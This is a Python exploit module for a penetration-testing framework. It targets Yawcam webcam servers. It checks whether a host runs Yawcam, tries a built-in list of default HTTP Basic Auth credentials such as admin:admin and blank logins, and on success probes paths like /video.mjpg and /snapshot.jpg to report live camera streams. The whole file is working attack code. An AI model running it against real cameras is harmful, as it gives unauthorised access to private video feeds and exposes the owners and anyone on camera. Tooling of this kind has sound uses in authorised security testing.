import re
from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Yawcam Webcam Server  -  Default HTTP Credentials.

    Yawcam (Yet Another Webcam Software) is a Windows Java webcam server
    commonly deployed with default credentials. The admin interface uses HTTP
    Basic Authentication. Streams are available at /video.mjpg or /out.jpg.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    """

    __info__ = {
        "name": "Yawcam Webcam Server Default HTTP Credentials",
        "description": (
            "Tests default HTTP Basic Auth credentials against Yawcam webcam server. "
            "On success, enumerates available stream/snapshot endpoints."
        ),
        "authors": (
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "http://www.yawcam.com/",
        ),
        "devices": (
            "Yawcam Webcam Server (Windows, Java)",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6, or file with targets")
    port = OptPort(8081, "Yawcam HTTP port (default: 8081)")

    CREDS = [
        ("admin", "admin"),
        ("admin", ""),
        ("", ""),
        ("user", "user"),
        ("admin", "password"),
        ("admin", "1234"),
        ("admin", "12345"),
    ]

    STREAM_PATHS = [
        "/video.mjpg",
        "/out.jpg",
        "/snapshot.jpg",
        "/snapshot",
        "/image.jpg",
        "/mjpg/video.mjpg",
    ]

    def run(self):
        if not self.check():
            print_error("Target does not appear to be a Yawcam server")
            return

        print_success("Yawcam server detected — testing default credentials")
        for user, pwd in self.CREDS:
            cred_str = "{}:{}".format(user, pwd) if user else "(no auth)"
            resp = self._try_auth(user, pwd)
            if resp is not None and resp.status_code == 200:
                print_success("Valid credentials: {}:{}".format(repr(user), repr(pwd)))
                self._probe_streams(user, pwd)
                return
        print_error("No default credentials worked")

    def _try_auth(self, user, pwd):
        try:
            import requests
            url = "http://{}:{}/".format(self.target, self.port)
            auth = (user, pwd) if user else None
            return requests.get(url, auth=auth, timeout=8, allow_redirects=True)
        except Exception:
            return None

    def _probe_streams(self, user, pwd):
        try:
            import requests
        except ImportError:
            return
        print_status("Probing stream/snapshot endpoints:")
        for path in self.STREAM_PATHS:
            try:
                url = "http://{}:{}{}".format(self.target, self.port, path)
                # Use HEAD to avoid blocking on MJPEG streams
                r = requests.head(url, auth=(user, pwd) if user else None, timeout=(3, 3))
                ct = r.headers.get("Content-Type", "")
                print_status("  {} -> HTTP {} ({})".format(path, r.status_code, ct))
                if r.status_code in (200, 206) and ("image" in ct or "video" in ct or "mjpeg" in ct or "multipart" in ct):
                    print_success("  LIVE STREAM/SNAPSHOT available at: {}".format(url))
            except Exception:
                pass

    @mute
    def check(self):
        resp = self.http_request(method="GET", path="/")
        if resp is None:
            return False
        server = resp.headers.get("Server", "").lower()
        if "yawcam" in server or "yawcam" in resp.text.lower():
            ver_m = re.search(r"yawcam[/ ]?([\d.]+)", resp.text, re.IGNORECASE)
            if ver_m:
                print_status("Yawcam version: {}".format(ver_m.group(1)))
            return True
        # Accept any HTTP 200/401 on the port as a possible Yawcam
        return resp.status_code in (200, 401)
